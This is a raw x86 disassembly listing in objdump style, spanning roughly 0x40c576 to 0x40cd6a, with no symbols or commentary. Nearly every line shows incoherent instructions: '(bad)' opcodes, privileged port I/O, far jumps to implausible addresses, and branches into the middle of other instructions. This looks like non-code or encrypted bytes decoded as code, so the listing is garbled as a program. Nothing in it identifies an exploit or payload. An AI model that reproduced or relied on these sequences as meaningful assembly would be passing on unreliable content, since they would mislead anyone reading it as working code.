  40c576:	(bad)  
  40c578:	aad    0xd2
  40c57a:	retf   
  40c57b:	out    0xbb,eax
  40c57d:	rcl    ebp,0xf0
  40c580:	repnz (bad) 
  40c582:	into   
  40c583:	leave  
  40c584:	mov    esi,0xc6ffb6c9
  40c589:	fcmovbe st,st(5)
  40c58b:	or     bl,ah
  40c58d:	push   es
  40c58e:	retf   
  40c58f:	jmp    0x40c57a
  40c591:	out    dx,al
  40c592:	clc    
  40c593:	fucomip st,st(1)
  40c595:	in     al,0xeb
  40c597:	retf   
  40c598:	iret   
  40c599:	aam    0xd5
  40c59b:	sti    
  40c59c:	ret    0xeff9
  40c59f:	enter  0xc5d5,0xcd
  40c5a3:	call   0xfb1bb766
  40c5a8:	into   
  40c5a9:	loop   0x40c59b
  40c5ab:	aam    0xca
  40c5ad:	fmul   st(0),st
  40c5af:	shr    al,0x7
  40c5b2:	or     ecx,DWORD PTR [eax]
  40c5b4:	(bad)  
  40c5b5:	leave  
  40c5b6:	les    ebp,FWORD PTR [edi-0x3b523f43]
  40c5bc:	in     eax,0xf4
  40c5be:	xbegin 0xed37ba82
  40c5c4:	loope  0x40c598
  40c5c6:	out    dx,al
  40c5c7:	iret   
  40c5c8:	add    eax,0xd5c2e6fe
  40c5cd:	loope  0x40c5ba
  40c5cf:	(bad)  ds:0xf9ecde01
  40c5d5:	repnz mov cl,0xb7
  40c5d8:	scas   al,BYTE PTR es:[edi]
  40c5d9:	mov    al,0xc8
  40c5db:	in     al,0xe2
  40c5dd:	mov    ah,0xcc
  40c5df:	enter  0xcfd4,0xd4
  40c5e3:	ret    
  40c5e4:	mov    al,0xcc
  40c5e6:	call   ebx
  40c5e8:	add    eax,0xfde7dee7
  40c5ed:	retf   
  40c5ee:	(bad)  
  40c5ef:	std    
  40c5f0:	mov    esp,0xea08e1e9
  40c5f5:	lods   eax,DWORD PTR ds:[esi]
  40c5f6:	fnsave [edi-0x11093444]
  40c5fc:	lods   al,BYTE PTR ds:[esi]
  40c5fd:	mov    ch,0xe9
  40c5ff:	mov    ch,0xb6
  40c601:	cmc    
  40c602:	aam    0xcc
  40c604:	jecxz  0x40c5e5
  40c606:	mov    esi,0xf2dab8d7
  40c60b:	fucomip st,st(1)
  40c60d:	lock ror DWORD PTR [eax],0x3
  40c611:	fimul  WORD PTR [esi]
  40c613:	or     BYTE PTR [eax],cl
  40c615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c616:	shr    ch,0xed
  40c619:	mov    al,0xe3
  40c61b:	lds    esi,FWORD PTR [edx-0x2c290d08]
  40c621:	in     eax,0xcc
  40c623:	jmp    0xf4be:0xf9dae9f0
  40c62a:	fcomi  st,st(7)
  40c62c:	jmp    0x40c635
  40c62e:	shl    dh,1
  40c630:	hlt    
  40c631:	psubb  mm1,QWORD PTR [ebx]
  40c634:	call   0xec286fe3
  40c639:	ret    
  40c63a:	mov    ch,0xe9
  40c63c:	fidiv  DWORD PTR [esi-0x4c000f36]
  40c642:	cmc    
  40c643:	out    dx,al
  40c644:	idiv   DWORD PTR [eax-0x1e283244]
  40c64a:	rcr    ah,1
  40c64c:	or     bl,bl
  40c64e:	(bad)  
  40c64f:	sti    
  40c650:	fucom  st(3)
  40c652:	(bad)  
  40c654:	cli    
  40c655:	mov    edi,0xd4c0cda9
  40c65a:	(bad)  
  40c65b:	mov    cl,0xf5
  40c65d:	iret   
  40c65e:	fprem1 
  40c660:	leave  
  40c661:	(bad)  
  40c662:	fucomp st(4)
  40c664:	jecxz  0x40c640
  40c666:	xlat   BYTE PTR ds:[ebx]
  40c667:	cmc    
  40c668:	into   
  40c669:	add    al,0xd4
  40c66b:	add    BYTE PTR [ebx],cl
  40c66d:	add    edi,eax
  40c66f:	test   DWORD PTR [edx],0xe0fc04fd
  40c675:	in     al,0xe0
  40c677:	repz (bad) 
  40c67a:	out    dx,al
  40c67b:	fstp   TBYTE PTR [ebx-0x29001a38]
  40c681:	icebp  
  40c682:	(bad)  
  40c683:	fdivr  QWORD PTR [edi-0x42251823]
  40c689:	out    0x1,eax
  40c68b:	mov    ebp,0xebf9d7df
  40c690:	jecxz  0x40c692
  40c692:	out    dx,al
  40c693:	cld    
  40c694:	loope  0x40c65e
  40c696:	shr    ch,0xf5
  40c699:	in     al,dx
  40c69a:	loop   0x40c697
  40c69c:	fcmovnbe st,st(7)
  40c69e:	into   
  40c69f:	vpaddq ymm2,ymm4,ymm6
  40c6a3:	jmp    0xede0:0xd3d2ccef
  40c6aa:	(bad)  
  40c6ab:	xlat   BYTE PTR ds:[ebx]
  40c6ac:	aam    0xe9
  40c6ae:	ror    ebx,0xff
  40c6b1:	pop    es
  40c6b2:	inc    BYTE PTR [ecx+esi*8]
  40c6b5:	lds    edi,FWORD PTR [eax-0xa31384e]
  40c6bb:	out    dx,al
  40c6bc:	shl    BYTE PTR [eax-0x1431150a],cl
  40c6c2:	fcom   st(4)
  40c6c4:	aad    0xfd
  40c6c6:	lock mov esi,0xe7d406f8
  40c6cc:	shl    edi,0xe0
  40c6cf:	pop    es
  40c6d0:	std    
  40c6d1:	(bad)  
  40c6d2:	into   
  40c6d3:	(bad)  
  40c6d5:	shl    esi,0xf2
  40c6d8:	out    0xb0,al
  40c6da:	mov    ch,0xd6
  40c6dc:	cmc    
  40c6dd:	out    0xd3,eax
  40c6df:	(bad)
  40c6e3:	(bad)  
  40c6e5:	(bad)  
  40c6e7:	in     al,dx
  40c6e8:	faddp  st(2),st
  40c6ea:	cli    
  40c6eb:	(bad)  
  40c6ec:	sar    dh,cl
  40c6ee:	rol    dh,1
  40c6f0:	pmaxub mm5,mm7
  40c6f3:	cli    
  40c6f4:	repnz fidivr WORD PTR [ebp-0x1c0f133e]
  40c6fb:	ret    0xdae7
  40c6fe:	(bad)  
  40c6ff:	shr    esi,cl
  40c701:	cld    
  40c702:	fidivr DWORD PTR [edi-0x19f82309]
  40c708:	stc    
  40c709:	in     eax,dx
  40c70a:	(bad)  
  40c70c:	loopne 0x40c6ee
  40c70e:	fild   WORD PTR [edx]
  40c710:	mov    esp,0xded9e80d
  40c715:	in     al,0xe0
  40c717:	mov    edi,0xe1f4afc1
  40c71c:	div    DWORD PTR [ebp-0x170a1517]
  40c722:	(bad)  
  40c723:	stc    
  40c724:	fldlg2 
  40c726:	sti    
  40c727:	mov    edi,0xded1e7b4
  40c72c:	cmc    
  40c72d:	or     edi,eax
  40c72f:	clc    
  40c730:	fld    st(6)
  40c732:	out    dx,al
  40c733:	std    
  40c734:	add    ch,dl
  40c736:	int    0xed
  40c738:	aad    0xcc
  40c73a:	shl    ah,0xec
  40c73d:	(bad)
  40c740:	xlat   BYTE PTR ds:[ebx]
  40c741:	in     al,0xfd
  40c743:	fcom   st(3)
  40c745:	jecxz  0x40c734
  40c747:	loope  0x40c739
  40c749:	cli    
  40c74a:	fiadd  DWORD PTR [esi]
  40c74c:	mov    BYTE PTR [ebx],0x7
  40c74f:	inc    BYTE PTR ds:0xe7d3d8cf
  40c755:	icebp  
  40c756:	fbstp  TBYTE PTR [eax-0x2c36491f]
  40c75c:	in     eax,0xf7
  40c75e:	test   ebp,0xc3b2f4cf
  40c764:	(bad)  
  40c766:	(bad)  
  40c767:	push   es
  40c768:	(bad)  
  40c769:	in     eax,dx
  40c76a:	fstp   st(7)
  40c76c:	add    edx,ecx
  40c76e:	in     al,0xdb
  40c770:	cld    
  40c771:	or     cl,ch
  40c773:	(bad)  
  40c774:	cld    
  40c775:	(bad)  
  40c777:	(bad)  
  40c778:	scas   al,BYTE PTR es:[edi]
  40c779:	loopne 0x40c762
  40c77b:	shr    ah,cl
  40c77d:	loopne 0x40c738
  40c77f:	(bad)  
  40c781:	sar    BYTE PTR [ecx-0x49442e4f],cl
  40c787:	mov    eax,0xcbbcd8f4
  40c78c:	loope  0x40c78d
  40c78e:	out    dx,eax
  40c78f:	aam    0xc6
  40c791:	fsubp  st(1),st
  40c793:	out    0xf3,al
  40c795:	into   
  40c796:	into   
  40c797:	icebp  
  40c798:	call   0xcd0b958f
  40c79d:	out    0xb4,eax
  40c79f:	lock enter 0xcbec,0xba
  40c7a4:	loope  0x40c764
  40c7a6:	out    dx,eax
  40c7a7:	in     eax,dx
  40c7a8:	loope  0x40c788
  40c7aa:	mov    ebp,0xc806cbe1
  40c7af:	fprem  
  40c7b1:	les    ecx,FWORD PTR [esi]
  40c7b3:	in     eax,dx
  40c7b4:	add    bh,BYTE PTR [eax-0x1f2a181b]
  40c7ba:	ret    
  40c7bb:	retf   0xf8d3
  40c7be:	in     eax,0xb4
  40c7c0:	fstp   TBYTE PTR [ebx-0x362f322c]
  40c7c6:	mov    dh,0xf2
  40c7c8:	add    eax,0xc1f0f6da
  40c7cd:	loop   0x40c7b2
  40c7cf:	jecxz  0x40c7ca
  40c7d1:	or     esp,eax
  40c7d3:	iret   
  40c7d4:	int    0xe7
  40c7d6:	call   0xee086cb1
  40c7db:	repnz loopne 0x40c7c8
  40c7de:	hlt    
  40c7df:	in     al,0xeb
  40c7e1:	int    0xdf
  40c7e3:	cld    
  40c7e4:	mov    ebx,0x7f3fef4
  40c7e9:	mov    ebp,0xead9e0e2
  40c7ee:	retf   0xf4f5
  40c7f1:	in     al,0xda
  40c7f3:	jmp    0xe6ea:0xc2ddb2ec
  40c7fa:	lods   eax,DWORD PTR ds:[esi]
  40c7fb:	sti    
  40c7fc:	mov    bh,0xf7
  40c7fe:	mov    ah,0xf9
  40c800:	mov    edx,0xd8baf7c5
  40c805:	ret    0xd7f8
  40c808:	icebp  
  40c809:	loopne 0x40c7e6
  40c80b:	idiv   dl
  40c80d:	(bad)  
  40c80f:	jmp    0xf39ad0f
  40c814:	retf   
  40c815:	retf   
  40c816:	out    0xf3,eax
  40c818:	shl    bh,0xd0
  40c81b:	aam    0xed
  40c81d:	mov    cl,0xec
  40c81f:	leave  
  40c820:	(bad)  
  40c821:	aam    0xb2
  40c823:	not    ebp
  40c825:	icebp  
  40c826:	(bad)  
  40c828:	fsubr  st(6),st
  40c82a:	(bad)  
  40c82b:	in     eax,0xdd
  40c82d:	or     esi,eax
  40c82f:	loop   0x40c830
  40c831:	int    0xcd
  40c833:	in     eax,dx
  40c834:	push   cs
  40c835:	(bad)
  40c838:	(bad)  
  40c839:	rep lods eax,DWORD PTR ds:[esi]
  40c83b:	iret   
  40c83c:	out    dx,eax
  40c83d:	(bad)  
  40c83f:	out    dx,al
  40c840:	int3   
  40c841:	sar    dh,cl
  40c843:	sar    DWORD PTR [esi-0x190a0901],1
  40c849:	ret    0xebfd
  40c84c:	mov    ah,0xde
  40c84f:	sti    
  40c850:	retf   0xe60b
  40c853:	retf   
  40c854:	cld    
  40c855:	int    0xe2
  40c857:	test   eax,0xb4efabe5
  40c85c:	mov    cl,0xea
  40c85e:	test   esp,0xc9dfc4cd
  40c864:	mov    ebx,0xc6d7dcbf
  40c869:	in     eax,dx
  40c86a:	lock add bh,BYTE PTR [eax-0x3a0b2716]
  40c871:	push   cs
  40c872:	(bad)  
  40c874:	or     al,bl
  40c876:	test   eax,0xcae7b7b2
  40c87b:	enter  0xe6b4,0xea
  40c87f:	fstp   TBYTE PTR [ecx-0x151c3321]
  40c885:	cld    
  40c886:	ret    
  40c887:	aam    0xf7
  40c889:	mov    ecx,0xbe1d902
  40c88f:	jmp    0xfb1bb59a
  40c894:	call   0xc922874a
  40c899:	aam    0xe9
  40c89b:	jecxz  0x40c872
  40c89d:	clc    
  40c89e:	fmul   st,st(2)
  40c8a0:	in     al,dx
  40c8a1:	sar    BYTE PTR [edi+0x2c3d9f7],cl
  40c8a7:	jecxz  0x40c899
  40c8a9:	hlt    
  40c8aa:	xlat   BYTE PTR ds:[ebx]
  40c8ab:	in     eax,0xdd
  40c8ad:	call   esp
  40c8af:	cld    
  40c8b0:	(bad)
  40c8b3:	fimul  WORD PTR [esi]
  40c8b5:	loop   0x40c87c
  40c8b7:	repnz mov bl,0xc3
  40c8ba:	rol    eax,cl
  40c8bc:	ror    ah,cl
  40c8be:	mov    al,0xc7
  40c8c0:	call   0xea29c18a
  40c8c5:	fstp   TBYTE PTR [edx+eiz*8-0x22b4129]
  40c8cc:	in     al,0xc4
  40c8ce:	aam    0x6
  40c8d0:	push   es
  40c8d1:	clc    
  40c8d2:	out    0xeb,eax
  40c8d4:	push   es
  40c8d5:	jmp    0x40c894
  40c8d7:	div    DWORD PTR [ecx-0x26054b35]
  40c8dd:	mov    edx,0xffedcaed
  40c8e2:	in     al,dx
  40c8e3:	repnz iret 
  40c8e5:	inc    bl
  40c8e7:	out    0xb8,al
  40c8e9:	mul    eax
  40c8eb:	jmp    0xc905:0xa0fe7f1
  40c8f2:	bswap  edx
  40c8f4:	pop    es
  40c8f5:	out    0xe0,eax
  40c8f7:	lods   eax,DWORD PTR ds:[esi]
  40c8f8:	aad    0xe3
  40c8fa:	out    dx,al
  40c8fb:	cmc    
  40c8fc:	enter  0xf0af,0xb8
  40c900:	test   ch,0xdc
  40c903:	enter  0xd202,0xb6
  40c907:	clc    
  40c908:	sti    
  40c909:	int3   
  40c90a:	shl    bh,cl
  40c90c:	(bad)  
  40c90d:	sti    
  40c90e:	out    0xe1,al
  40c910:	clc    
  40c911:	out    0xcd,al
  40c913:	jmp    0xe9c9:0xc2f0c9ef
  40c91a:	shl    ebx,cl
  40c91c:	test   al,0xfb
  40c91e:	scas   al,BYTE PTR es:[edi]
  40c91f:	jmp    0xe2d8:0xeff9cad1
  40c926:	stc    
  40c927:	(bad)  
  40c929:	rol    esi,0xd5
  40c92c:	or     edx,eax
  40c92e:	retf   
  40c92f:	cli    
  40c930:	call   0x233a51a
  40c935:	int    0xcb
  40c937:	mov    bl,0xd6
  40c939:	scas   eax,DWORD PTR es:[edi]
  40c93a:	mov    edi,0xdeede6cc
  40c940:	stc    
  40c941:	jmp    0x6cf:0xe3ded6e8
  40c948:	stc    
  40c949:	int    0xc5
  40c94b:	mov    ecx,0xebdf0702
  40c950:	add    bh,bh
  40c952:	or     bl,bl
  40c954:	jmp    0x40c913
  40c956:	retf   0xe8c5
  40c959:	out    0xea,al
  40c95b:	(bad)
  40c95e:	(bad)  
  40c960:	enter  0xf1c4,0xda
  40c964:	add    edi,edi
  40c966:	loope  0x40c940
  40c968:	pop    es
  40c969:	mov    ebp,0xc6010304
  40c96e:	retf   
  40c96f:	fld    st(5)
  40c971:	fcom   st(4)
  40c973:	add    DWORD PTR [edi],eax
  40c975:	mov    esp,0xadc3cacb
  40c97a:	mov    dh,0xf2
  40c97c:	into   
  40c97d:	cmc    
  40c97e:	fmul   st,st(7)
  40c980:	enter  0xf5ee,0xf0
  40c984:	hlt    
  40c985:	fstp   TBYTE PTR [eax-0x9fb2e40]
  40c98b:	or     eax,DWORD PTR [esi]
  40c98d:	aam    0xb
  40c98f:	std    
  40c990:	out    dx,al
  40c991:	lds    eax,FWORD PTR [esi]
  40c993:	clc    
  40c994:	adc    esi,DWORD PTR [edx-0x544f533f]
  40c99a:	ret    
  40c99b:	in     al,0xf1
  40c99d:	shl    ebp,cl
  40c99f:	jmp    0xbdcf:0xdde9ccfa
  40c9a6:	(bad)  
  40c9a7:	clc    
  40c9a8:	pop    es
  40c9a9:	mov    edi,0xe9d5d4fd
  40c9ae:	jmp    0xd514cd99
  40c9b3:	loope  0x40c9b2
  40c9b5:	out    dx,eax
  40c9b6:	stos   BYTE PTR es:[edi],al
  40c9b7:	mov    bl,0xea
  40c9b9:	scas   eax,DWORD PTR es:[edi]
  40c9ba:	iret   
  40c9bb:	cli    
  40c9bc:	into   
  40c9bd:	mov    ecx,0xeffaadc7
  40c9c2:	out    dx,eax
  40c9c3:	add    edi,edx
  40c9c5:	shl    ebp,1
  40c9c7:	mov    ebp,0x3fa03dd
  40c9cc:	stc    
  40c9cd:	add    bh,dl
  40c9cf:	push   cs
  40c9d0:	(bad)  
  40c9d2:	int3   
  40c9d3:	out    dx,eax
  40c9d4:	or     esp,ecx
  40c9d6:	iret   
  40c9d7:	enter  0xf4bc,0xcf
  40c9db:	fcmovnu st,st(3)
  40c9dd:	leave  
  40c9de:	in     al,dx
  40c9df:	mov    eax,0xfaefeadb
  40c9e4:	shr    esi,cl
  40c9e6:	add    bh,BYTE PTR [ecx-0x3b27290b]
  40c9ec:	stc    
  40c9ed:	(bad)  
  40c9ee:	add    al,al
  40c9f0:	(bad)  
  40c9f1:	aam    0x9
  40c9f3:	call   0xc90ca800
  40c9f8:	out    dx,eax
  40c9f9:	(bad)  
  40c9fa:	into   
  40c9fb:	lods   al,BYTE PTR ds:[esi]
  40c9fc:	out    dx,eax
  40c9fd:	cli    
  40c9fe:	test   esi,0xbfdfc4f8
  40ca04:	aad    0xcf
  40ca06:	add    eax,esp
  40ca08:	ret    
  40ca09:	(bad)  
  40ca0a:	loopne 0x40c9eb
  40ca0c:	(bad)  
  40ca0d:	cli    
  40ca0e:	test   DWORD PTR [edx],0xc03d5d6
  40ca14:	loope  0x40c9c8
  40ca16:	fcomip st,st(6)
  40ca18:	(bad)  
  40ca1a:	into   
  40ca1b:	shl    bh,0xe9
  40ca1e:	(bad)  
  40ca1f:	mov    ebx,0xedeafdf1
  40ca24:	fdivr  st,st(7)
  40ca26:	cmc    
  40ca27:	shl    esi,cl
  40ca29:	rcr    esp,cl
  40ca2b:	fisttp WORD PTR [edx]
  40ca2d:	aam    0xe6
  40ca2f:	shl    ah,0xfe
  40ca32:	cli    
  40ca33:	in     eax,dx
  40ca34:	icebp  
  40ca35:	lock out 0xcf,eax
  40ca38:	out    0xef,al
  40ca3a:	ret    0xcaf5
  40ca3d:	mov    dh,0xae
  40ca3f:	aam    0xf1
  40ca41:	in     eax,dx
  40ca42:	iret   
  40ca43:	mov    cl,0xbd
  40ca45:	fdivr  QWORD PTR [ebp-0x6221c2c]
  40ca4b:	cld    
  40ca4c:	in     eax,0xf9
  40ca4e:	or     DWORD PTR [esi],ecx
  40ca50:	or     eax,0xe9f8e2ec
  40ca55:	scas   al,BYTE PTR es:[edi]
  40ca56:	mov    esp,0xf7cabda9
  40ca5b:	jmp    0x40ca47
  40ca5d:	iret   
  40ca5e:	ror    cl,0xe6
  40ca61:	cmc    
  40ca62:	(bad)  
  40ca63:	mov    esi,0xd1c0ecc3
  40ca68:	mov    ah,0xdb
  40ca6a:	std    
  40ca6b:	add    eax,0xf7d905da
  40ca70:	add    ah,bh
  40ca72:	in     eax,dx
  40ca73:	in     eax,0xdc
  40ca75:	bnd ret 
  40ca77:	mov    ebp,0xd2f1cfef
  40ca7c:	aam    0xe1
  40ca7e:	out    0xce,al
  40ca80:	aam    0xde
  40ca82:	mov    edx,0xbcd7bcfd
  40ca87:	mov    ecx,0xdbfebdec
  40ca8c:	fsubr  st(6),st
  40ca8e:	sti    
  40ca8f:	iret   
  40ca90:	push   cs
  40ca91:	fld    st(5)
  40ca93:	or     ebp,edx
  40ca95:	out    0xc4,eax
  40ca97:	call   0xea12a28c
  40ca9c:	enter  0xeee1,0xd6
  40caa0:	sar    DWORD PTR [ebx-0xb11464a],1
  40caa6:	fsubp  st(4),st
  40caa8:	clc    
  40caa9:	rcr    bh,1
  40caab:	icebp  
  40caac:	retf   0xdb
  40caaf:	add    eax,0x20edbd6
  40cab4:	pop    es
  40cab5:	mov    edi,0xd2e8adae
  40caba:	les    ebp,FWORD PTR [ebp-0x204e322f]
  40cac0:	icebp  
  40cac1:	lock call 0xed0a88be
  40cac7:	(bad)  
  40cac8:	std    
  40cac9:	mov    ebx,0xfec6fbe6
  40cacf:	jmp    0x40ca99
  40cad1:	in     al,0xed
  40cad3:	add    eax,DWORD PTR [edx]
  40cad5:	shr    DWORD PTR [edx-0x3b511d4e],cl
  40cadb:	mov    ah,0xe6
  40cadd:	mov    al,0xe7
  40cadf:	mov    ch,0xd5
  40cae1:	fmulp  st(2),st
  40cae3:	jecxz  0x40cab8
  40cae5:	rol    bl,1
  40cae7:	(bad)  
  40cae9:	shr    bl,0xf4
  40caec:	out    0xe8,al
  40caee:	(bad)  
  40caef:	retf   
  40caf0:	(bad)  
  40caf2:	paddsb mm1,QWORD PTR [edi]
  40caf5:	test   al,0xcf
  40caf7:	out    dx,al
  40caf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf9:	mov    dh,0xd7
  40cafb:	in     al,dx
  40cafc:	mov    al,0xd5
  40cafe:	in     eax,0xce
  40cb00:	std    
  40cb01:	mov    ch,0xd1
  40cb03:	fidiv  DWORD PTR [edx+edi*4-0x3e01082a]
  40cb0a:	jmp    edi
  40cb0c:	mov    ebp,0xe4d8fc00
  40cb12:	int3   
  40cb13:	retf   
  40cb14:	shr    BYTE PTR [ebp-0x102d133c],cl
  40cb1a:	test   dl,0xea
  40cb1d:	rcl    dl,cl
  40cb1f:	(bad)  
  40cb20:	(bad)  
  40cb22:	test   dh,0xb8
  40cb25:	neg    cl
  40cb27:	inc    DWORD PTR [ebx]
  40cb29:	vshufpd ymm2,ymm0,ymm6,0xdf
  40cb2e:	cli    
  40cb2f:	pop    es
  40cb30:	retf   0xc6ec
  40cb33:	loopne 0x40caff
  40cb35:	mov    esp,0xb6b1e6ad
  40cb3a:	shr    BYTE PTR [ebx+esi*4-0x14153b2f],cl
  40cb41:	(bad)  
  40cb42:	mov    edi,0xb9d5dade
  40cb47:	fdivr  DWORD PTR [ebx+eax*1-0x3c3afa1e]
  40cb4e:	loop   0x40cb15
  40cb50:	(bad)  
  40cb51:	out    dx,al
  40cb52:	mov    BYTE PTR [edx+ecx*8],0xeb
  40cb56:	fdivr  st(2),st
  40cb58:	shr    eax,cl
  40cb5a:	loopne 0x40cb48
  40cb5c:	mov    dh,0xea
  40cb5e:	lock lods eax,DWORD PTR ds:[esi]
  40cb60:	call   0xc40cb74a
  40cb65:	int    0xed
  40cb67:	fucomip st,st(6)
  40cb69:	cld    
  40cb6a:	add    eax,0xf6e5e905
  40cb6f:	(bad)  
  40cb70:	(bad)
  40cb73:	add    edx,DWORD PTR [ebx]
  40cb75:	fadd   st,st(7)
  40cb77:	jmp    0xe4ce:0xe1f2cfd2
  40cb7e:	mov    edx,0xc9ddefed
  40cb83:	cld    
  40cb84:	idiv   BYTE PTR [edx+edi*8-0xb0a0d01]
  40cb8b:	ret    0xc6de
  40cb8e:	fisttp DWORD PTR [ecx]
  40cb90:	in     al,0xfd
  40cb92:	push   es
  40cb93:	or     al,0xdd
  40cb95:	mov    edi,0xddcbe6ae
  40cb9a:	retf   
  40cb9b:	mov    ebx,0xecf3f2f0
  40cba0:	mov    bh,0xd5
  40cba2:	jmp    0x810c39f
  40cba7:	fiadd  WORD PTR [ecx]
  40cba9:	add    DWORD PTR [eax+esi*8],eax
  40cbac:	(bad)  
  40cbad:	sti    
  40cbae:	ret    0xc4df
  40cbb1:	(bad)  
  40cbb3:	call   0xe42b8ac6
  40cbb8:	(bad)  
  40cbb9:	retf   
  40cbba:	in     eax,0xe2
  40cbbc:	call   0xbc259faa
  40cbc1:	mov    ecx,0x1fcb8d2
  40cbc6:	std    
  40cbc7:	xlat   BYTE PTR ds:[ebx]
  40cbc8:	fcmovbe st,st(1)
  40cbca:	cli    
  40cbcb:	test   ch,0xd6
  40cbce:	fld    st(7)
  40cbd0:	or     BYTE PTR [esi],al
  40cbd2:	loop   0x40cbdd
  40cbd4:	fldcw  WORD PTR [edx-0x38150840]
  40cbda:	jmp    0x40cbc9
  40cbdc:	in     eax,dx
  40cbdd:	rcr    bl,cl
  40cbdf:	aam    0xe6
  40cbe1:	(bad)  
  40cbe2:	mov    edi,0xffdcf1f8
  40cbe7:	shl    al,cl
  40cbe9:	out    0xd5,eax
  40cbeb:	rcr    bh,1
  40cbed:	cli    
  40cbee:	jmp    0x40cbd7
  40cbf0:	sar    dh,0xc5
  40cbf3:	add    al,0x11
  40cbf5:	scas   eax,DWORD PTR es:[edi]
  40cbf6:	mov    eax,0xd1c2cccb
  40cbfb:	cli    
  40cbfc:	repnz loopne 0x40cbe4
  40cbff:	(bad)
  40cc02:	repz fild WORD PTR [ecx]
  40cc05:	aad    0xe3
  40cc07:	fcmovu st,st(5)
  40cc09:	(bad)  
  40cc0a:	loopne 0x40cbf2
  40cc0c:	(bad)  
  40cc0d:	loopne 0x40cc07
  40cc0f:	fisttp QWORD PTR [eax]
  40cc11:	add    ecx,DWORD PTR [edi]
  40cc13:	add    al,0xe
  40cc15:	rol    dh,1
  40cc17:	int3   
  40cc18:	out    dx,eax
  40cc19:	mov    bh,0xb7
  40cc1b:	loope  0x40cbcd
  40cc1d:	rcl    ebp,0xcc
  40cc20:	in     al,0xe5
  40cc22:	jmp    0x40cc0e
  40cc24:	(bad)  
  40cc26:	(bad)  
  40cc28:	sar    bl,0xde
  40cc2b:	neg    ch
  40cc2d:	add    al,0xf6
  40cc2f:	fcom   st(6)
  40cc31:	(bad)  
  40cc33:	fmul   st,st(1)
  40cc35:	out    dx,al
  40cc36:	int3   
  40cc37:	lods   al,BYTE PTR ds:[esi]
  40cc38:	in     al,dx
  40cc39:	(bad)  
  40cc3a:	into   
  40cc3b:	ror    cl,1
  40cc3d:	repz mov cl,0xc6
  40cc40:	fcmove st,st(4)
  40cc42:	(bad)  
  40cc43:	enter  0xe1ed,0xf4
  40cc47:	(bad)  
  40cc48:	add    edx,esp
  40cc4a:	fcmovnu st,st(6)
  40cc4c:	out    0xd1,eax
  40cc4e:	or     DWORD PTR [edx],ecx
  40cc50:	fucom  st(0)
  40cc52:	in     eax,0xe2
  40cc54:	int    0xd1
  40cc56:	out    0xec,al
  40cc58:	lock out dx,eax
  40cc5a:	fadd   st(7),st
  40cc5c:	in     eax,dx
  40cc5d:	mov    ch,0xd9
  40cc5f:	fnstenv [esi-0x4f0e0545]
  40cc65:	sar    esi,cl
  40cc67:	fcomip st,st(0)
  40cc69:	ffreep st(7)
  40cc6b:	cmc    
  40cc6c:	repnz leave 
  40cc6e:	sti    
  40cc6f:	fucomi st,st(0)
  40cc71:	cld    
  40cc72:	leave  
  40cc73:	out    0xd9,eax
  40cc75:	in     al,dx
  40cc76:	fsubr  st,st(1)
  40cc78:	retf   
  40cc79:	repz xlat BYTE PTR ds:[ebx]
  40cc7b:	mov    bl,0xec
  40cc7d:	iret   
  40cc7e:	in     eax,0xd8
  40cc80:	(bad)  
  40cc81:	jmp    0xcf2ac069
  40cc86:	clc    
  40cc87:	add    al,al
  40cc89:	(bad)  
  40cc8b:	jmp    0xe2c6:0xc5dbcbd2
  40cc92:	add    eax,0xdeb9e8d8
  40cc97:	fmul   st(5),st
  40cc99:	call   0xea0eaf90
  40cc9e:	mov    al,0xdf
  40cca0:	mov    ecx,0xd9f0fdbe
  40cca5:	sar    cl,1
  40cca7:	stc    
  40cca8:	fyl2x  
  40ccaa:	add    al,0xf2
  40ccac:	jmp    0x40cc85
  40ccae:	leave  
  40ccaf:	cld    
  40ccb0:	in     eax,dx
  40ccb1:	dec    ecx
  40ccb3:	adc    ebp,ebp
  40ccb5:	mov    eax,0xacc0cbe9
  40ccba:	mov    ch,0xdb
  40ccbc:	jmp    0x40cc89
  40ccbe:	ror    al,cl
  40ccc0:	idiv   DWORD PTR [edx-0x373c0c2c]
  40ccc6:	fidivr DWORD PTR [esi+ecx*8-0x1a460c0a]
  40cccd:	or     edi,ebx
  40cccf:	or     esp,eax
  40ccd1:	ret    
  40ccd2:	add    al,cl
  40ccd4:	add    esp,ebx
  40ccd6:	shl    ebx,cl
  40ccd8:	(bad)  
  40ccd9:	mov    ch,0xc3
  40ccdb:	sti    
  40ccdc:	in     eax,0xe6
  40ccde:	inc    ebp
  40cce0:	mov    dh,0xf0
  40cce2:	jmp    0x40ccaf
  40cce4:	in     al,dx
  40cce5:	cld    
  40cce6:	mov    esi,0xebdad2f3
  40cceb:	hlt    
  40ccec:	(bad)  
  40ccee:	retf   0xbc0e
  40ccf1:	aam    0xe9
  40ccf3:	call   0xce309ffd
  40ccf8:	out    0xea,al
  40ccfa:	in     al,dx
  40ccfb:	mov    dl,0xb3
  40ccfd:	in     eax,0xc8
  40ccff:	mov    bh,0xd3
  40cd01:	hlt    
  40cd02:	mov    dl,0xd6
  40cd04:	stc    
  40cd05:	fdecstp 
  40cd07:	in     al,dx
  40cd08:	loopne 0x40cce5
  40cd0a:	clc    
  40cd0b:	hlt    
  40cd0c:	aam    0xd6
  40cd0e:	fadd   DWORD PTR [esi]
  40cd10:	fmul   st(6),st
  40cd12:	loope  0x40ccf1
  40cd14:	adc    ah,BYTE PTR [edi-0x2a2c3e43]
  40cd1a:	mov    al,0xc8
  40cd1c:	rcr    eax,1
  40cd1e:	jmp    0xb33186ea
  40cd23:	mov    ecx,0xfad7c2f5
  40cd28:	fdiv   st(6),st
  40cd2a:	stc    
  40cd2b:	sti    
  40cd2c:	in     al,0xc7
  40cd2e:	add    al,0xe
  40cd30:	aad    0xe4
  40cd32:	fcomp  st(0)
  40cd34:	pop    es
  40cd35:	jmp    0x40ccdf
  40cd37:	int3   
  40cd38:	out    0xe7,eax
  40cd3a:	(bad)  
  40cd3b:	out    0xfb,eax
  40cd3d:	enter  0xbbf7,0xc4
  40cd41:	cmc    
  40cd42:	jecxz  0x40cd20
  40cd44:	(bad)  
  40cd46:	(bad)  
  40cd47:	in     al,dx
  40cd48:	loop   0x40cd0b
  40cd4a:	(bad)
  40cd4d:	mov    edi,0x2dbc600
  40cd52:	std    
  40cd53:	std    
  40cd54:	repz call 0xd436b921
  40cd5a:	lods   eax,DWORD PTR ds:[esi]
  40cd5b:	rcl    bh,cl
  40cd5d:	jmp    0x40cd44
  40cd5f:	in     al,dx
  40cd60:	mov    al,0xe9
  40cd62:	mov    eax,0xd0e9e3d2
  40cd67:	loope  0x40cd25
  40cd69:	cli    
  40cd6a:	std    
